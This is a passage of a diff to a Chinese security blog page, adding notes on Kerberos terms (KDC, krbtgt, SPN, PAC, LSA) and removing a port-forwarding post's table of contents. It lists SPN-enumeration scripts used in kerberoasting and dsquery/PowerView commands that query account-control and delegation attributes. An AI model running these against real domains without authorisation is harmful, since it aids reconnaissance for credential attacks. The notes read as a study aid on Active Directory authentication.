+</code></pre><h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h3><p>是Windows活动目录中使用的客户/服务器认证协议(windows中的认证协议有两种NTLM和Kerberos),为通信双方提供双向身份认证。</p>
+<p>相互认证或请求服务的实体被称为委托人(principal)。参与的中央服务器被称为密钥分发中心(简称KDC)。</p>
+<p>KDC(密钥分发中心　Key Distribution Center)有两个服务组成 : </p>
+<pre><code>1. AS 身份验证服务(Authentication Server)
+2. TGS 票据授予服务(Ticket Granting Server)
+该认证过程的实现不依赖于主机操作系统的认证,无需基于主机地址的信任,不要求网络上所有主机的物理安全,并假定网络上传送的数据包可以被任意地读取.修改和插入数据。
+在以上情况下, Kerberos 作为一种可信任的第三方认证服务,是通过传统的密码技术(如:共享密钥)执行认证服务的。
+</code></pre><h3 id="krbtgt账户"><a href="#krbtgt账户" class="headerlink" title="krbtgt账户"></a>krbtgt账户</h3><p>每个域控制器DC都有一个”krbtgt”的用户账户,是KDC的服务账户,用来创建票据授予服务(TGS)加密的密钥。</p>
+<h3 id="Principal-委托人"><a href="#Principal-委托人" class="headerlink" title="Principal　委托人"></a>Principal　委托人</h3><p>一个具有唯一标识的实体,可以是一台计算机或一项服务,通过使用KDC颁发的票据来进行通信。委托人可以分为两类: 用户和服务,分别具有不同种类的标识符。Kerberos信任模型的核心是每个委托人(principal)和KDC的通信是在利用仅双方可知的密钥构建的安全通道中进行。</p>
+<p>当委托人(principal)之间需要通信的时候,它们再使用KDC生成的会话密钥。</p>
+<pre><code>1. 用户 (UPN)
+    用户通过如&quot;user@REALM&quot;格式的用户主体名称(User Principal Name,简称UPN)来标识。记住REALM一定是大写的。
+2. 服务 (SPN)
+    服务主体名称(Service Principal Name,简称SPN)是Kerberos身份验证服务(AS)所必需。
+    用于域中的服务和计算机账户。SPN的格式形如&quot;serviceclass/host_port/serviceName&quot;。
+    例如, 主机&quot;dc1.bhusa.com&quot;上LDAP服务的SPN可能类似于&quot;ldap/dc1.bhusa.com&quot;, &quot;ldap/dc1&quot;和&quot;ldap/dc1.bhusa.com/bhusa.com&quot;。
+    参考全限定主机名和仅主机名,一个服务可能注册为多个SPN。(同通常是执行DNS查询来规范化主机名称。这就解释了DNS为什么是微软Kerberos环境中的一个必要组件。查询服务的&quot;规范化&quot;名称,然后生成请求服务的SPN。)
+</code></pre><p><code>枚举域帐户的SPN</code></p>
+<pre><code>GetUserSPNS.ps1 - https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
+Find-PSServiceAccounts.ps1 - https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts
+PowerView 的 Get-NetUser -SPN - https://github.com/PowerShellMafia/PowerSploit/blob/5690b09027b53a5932e42399f6943e03fa32e549/Recon/PowerView.ps1#L2087-L2089
+</code></pre><p><img src="/2018/02/18/Kerberos认证相关/getspn.png" alt="getspn"></p>
+<h3 id="PAC-Privilege-Access-Certificate-特权访问证书"><a href="#PAC-Privilege-Access-Certificate-特权访问证书" class="headerlink" title="PAC (Privilege Access Certificate 特权访问证书)"></a>PAC (Privilege Access Certificate 特权访问证书)</h3><p>KDC在向Kerberos客户端颁发TGT时,会向本地LSA (Local Security Authority)请求生成一个特殊的数据结构,名为”特权访问证书”这个PAC包含为Kerberos客户端构建一个本地访问令牌所需的用户信息,他同时使用域控制器服务器的私钥和KDC服务器的私钥来进行数字签署,以防假的KDC伪造PAC。</p>
+<p><code>PAC数据结构</code></p>
+<pre><code>1. 用户的登入时间以及用户会话额到期时间
+2. 用户上一次设置密码的时间,以及允许他再次更改密码的时间
+3. 用户的经典登入名,domain\user
+4. 用户的显示名称
+5. 指派给用户账户的经典NT登入脚本的名称(如果有的话)
+6. 用户漫游配置文件的UNC路径
+7. 客户端主目录的UNC路径
+8. 用户的并发登入数
+9. 在颁发PAC的KDC处,自从上一次成功登入以来,所允许的不成功登入尝试次
+10. 用户的RID
+11. 用户的&quot;主要组&quot;的RID,只限在POSIX使用
+12. 在域中,将用户作为一个成员的组的数量,以及每个组的RID
+13. 适用于用户的已知SID
+14. 域的SID
+15. 资源域的SID
+</code></pre><p>除此之外,PAC中还嵌入了另一个名为<code>用户账户控制</code>的数据结构<br>如何得到</p>
+<p>powerview </p>
+<pre><code>Get-ComputerProperty -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl
+Get-UserProperty -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl
+</code></pre><p>dsquery</p>
+<pre><code>dsquery * -limit 0 -filter &quot;(&amp;(objectCategory=computer)(objectClass=computer))&quot; -attr cn operatingSystem distinguishedName useraccountcontrol msds-allowedtodelegateto
+dsquery * -l -limit 0 -filter &quot;&amp;(!objectClass=computer)(servicePrincipalName=*)&quot; -attr serviceprincipalname name samaccountname memberof pwdlastset distinguishedname useraccountcontrol
+dsquery * -limit 0 -filter &quot;(&amp;(objectCategory=user)(objectClass=user))&quot; -attr cn distinguishedName useraccountcontrol msds-allowedtodelegateto
+</code></pre><h3 id="LSA-Local-Security-Authority"><a href="#LSA-Local-Security-Authority" class="headerlink" title="LSA (Local Security Authority)"></a>LSA (Local Security Authority)</h3><p>LSA管理本地安全策略、管理审计策略和设置、为用户生成包含SID和组权限关系的令牌。LSA验证的过程: LSA通过访问本地SAM(Security Accounts Manager)数据库,可以完成本地用户的验证。</p>
+<p><code>LSA的处理流程</code>: </p>
+<pre><code>1. LSA首先会把身份凭据交给SSPI,由该接口负责与Kerberos和NTLM服务沟通。
+2. SSPI不能确定用户是本地登录还是域账户进行域登录。所以他会先把身份认证请求传递到Kerberos SSP。
+3. Kerberos SSP会验证用户的登入目标是本地计算机还是域。如果是登录域,Kerberos SSP将继续处理。如果是本地计算机,即用户不是登录域,Kerberos SSP返回一个错误消息到SSPI,交回给GINA处理,使服务器登录不可用。
+4. SSPI现在发送请求到下一个安全提供程序——NTLM。NTLM SSP会将请求交给Netlogon服务针对LSAM (Local Security Account Manager,本地安全账户管理器)数据库进行身份认证。使用NTLM SSP的身份认证过程与Windows NT系统的身份认证方法是相同的。
+</code></pre><h2 id="相关"><a href="#相关" class="headerlink" title="相关"></a>相关</h2><p><strong>krbtgt 密码</strong></p>
+<p>它是整个活动目录中唯一的不会自动更新的密码。<br>除非:</p>
+<pre><code>第一种情况: 域功能级别(domain functional level,简称DFL)从NT5(2000/2003)升级到NT6(2008/2012)。
+第二种情况: 利用域的恢复数据来实施域的裸机恢复(bare metal recovery)。
+</code></pre><p><strong>Kerberos智能卡进行身份认证</strong></p>
+<p>Kerberos也允许使用PKI和智能卡进行身份认证。用户会被提示输入一个智能卡的PIN码,而不是口令。</p>
+<p>Windows使用PIN码来访问智能卡上的公钥证书(public key certification)。利用智能卡的私钥签名该证书,并发送到KDC。</p>
+<p>KDC验证证书上的签名是否源于可信实体。然后KDC发送公钥证书加密过的TGT。既然信息只能被智能卡的私钥解密,用户也就通过了域的身份认证。</p>
+<p>然而,对于使用智能卡进行身份认证的账户来说,密码的散列值仍然存储在域控服务器上。此外,智能卡只能对”交互式会话(interactive sessions)”提供保护。</p>
+<p>也就意味着智能卡认证仅能用于登录域中的计算机。</p>
+<h2 id="參考"><a href="#參考" class="headerlink" title="參考"></a>參考</h2><pre><code>深入解读MS14-068漏洞:微软精心策划的后门?
+    http://www.freebuf.com/vuls/56081.html
+敞开的地狱之门:Kerberos协议的滥用
+    http://www.freebuf.com/articles/system/45631.html
+你所不知道的Kerberos 整理笔记(三)
+    http://www.voidcn.com/article/p-nnpovuml-ng.html
+</code></pre>
       
     </div>
     
@@ -704,9 +559,11 @@ proxychains        http://proxychains.sourceforge.net/
       
         <div class="post-tags">
           
-            <a href="/tags/笔记/" rel="tag"># 笔记</a>
+            <a href="/tags/KDC/" rel="tag"># KDC</a>
           
-            <a href="/tags/端口转发/" rel="tag"># 端口转发</a>
+            <a href="/tags/Kerberos/" rel="tag"># Kerberos</a>
+          
+            <a href="/tags/笔记/" rel="tag"># 笔记</a>
           
         </div>
       
@@ -719,8 +576,8 @@ proxychains        http://proxychains.sourceforge.net/
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/02/27/端口转发之SSH隧道/" rel="next" title="端口转发之SSH隧道">
-                <i class="fa fa-chevron-left"></i> 端口转发之SSH隧道
+              <a href="/2018/01/27/端口转发总结/" rel="next" title="端口转发总结">
+                <i class="fa fa-chevron-left"></i> 端口转发总结
               </a>
             
           </div>
@@ -729,8 +586,8 @@ proxychains        http://proxychains.sourceforge.net/
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/03/28/批量导出ElasticSearch查询的结果/" rel="prev" title="批量导出ElasticSearch查询的结果">
-                批量导出ElasticSearch查询的结果 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/02/19/域渗透相关/" rel="prev" title="域渗透相关">
+                域渗透相关 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -911,7 +768,7 @@ proxychains        http://proxychains.sourceforge.net/
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#传统反弹与网络发现"><span class="nav-number">1.</span> <span class="nav-text">传统反弹与网络发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#iptables"><span class="nav-number">2.</span> <span class="nav-text">iptables</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EarthWorm-绕防火墙"><span class="nav-number">3.</span> <span class="nav-text">EarthWorm[绕防火墙]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shell反弹不出-DMZ"><span class="nav-number">4.</span> <span class="nav-text">Shell反弹不出[DMZ]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSH隧道"><span class="nav-number">5.</span> <span class="nav-text">SSH隧道</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Netsh-tcp"><span class="nav-number">6.</span> <span class="nav-text">Netsh[tcp]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nc-正向"><span class="nav-number">7.</span> <span class="nav-text">nc [正向]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lcx-内网转发"><span class="nav-number">8.</span> <span class="nav-text">lcx 内网转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reGeorg"><span class="nav-number">9.</span> <span class="nav-text">reGeorg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tunna-速度较慢"><span class="nav-number">10.</span> <span class="nav-text">Tunna[速度较慢]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-portmap-端口映射"><span class="nav-number">11.</span> <span class="nav-text">Linux portmap 端口映射</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#端口转发之PowerShell"><span class="nav-number">12.</span> <span class="nav-text">端口转发之PowerShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#metasploit"><span class="nav-number">13.</span> <span class="nav-text">metasploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防火墙开启的ms17-010"><span class="nav-number">14.</span> <span class="nav-text">防火墙开启的ms17-010</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Socks代理工具"><span class="nav-number">15.</span> <span class="nav-text">Socks代理工具</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos认证过程-简易版"><span class="nav-number">1.</span> <span class="nav-text">Kerberos认证过程 (简易版)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos认证过程-详细版"><span class="nav-number">2.</span> <span class="nav-text">Kerberos认证过程 (详细版)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Client-A-—-gt-KDC-AS"><span class="nav-number">2.1.</span> <span class="nav-text">1. Client-A —&gt; KDC-AS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Client-A-lt-—-KDC-AS"><span class="nav-number">2.2.</span> <span class="nav-text">2. Client-A &lt;— KDC-AS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Client-A-—-gt-KDC-TGS"><span class="nav-number">2.3.</span> <span class="nav-text">3. Client-A —&gt; KDC-TGS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Client-A-lt-—-KDC-TGS"><span class="nav-number">2.4.</span> <span class="nav-text">4. Client-A &lt;— KDC-TGS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Client-A-—-gt-Server-B"><span class="nav-number">2.5.</span> <span class="nav-text">5. Client-A —&gt; Server-B</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#术语"><span class="nav-number">3.</span> <span class="nav-text">术语</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Kerberos"><span class="nav-number">3.1.</span> <span class="nav-text">Kerberos</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#krbtgt账户"><span class="nav-number">3.2.</span> <span class="nav-text">krbtgt账户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Principal-委托人"><span class="nav-number">3.3.</span> <span class="nav-text">Principal　委托人</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PAC-Privilege-Access-Certificate-特权访问证书"><span class="nav-number">3.4.</span> <span class="nav-text">PAC (Privilege Access Certificate 特权访问证书)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LSA-Local-Security-Authority"><span class="nav-number">3.5.</span> <span class="nav-text">LSA (Local Security Authority)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#相关"><span class="nav-number">4.</span> <span class="nav-text">相关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#參考"><span class="nav-number">5.</span> <span class="nav-text">參考</span></a></li></ol></div>
             
 
           </div>
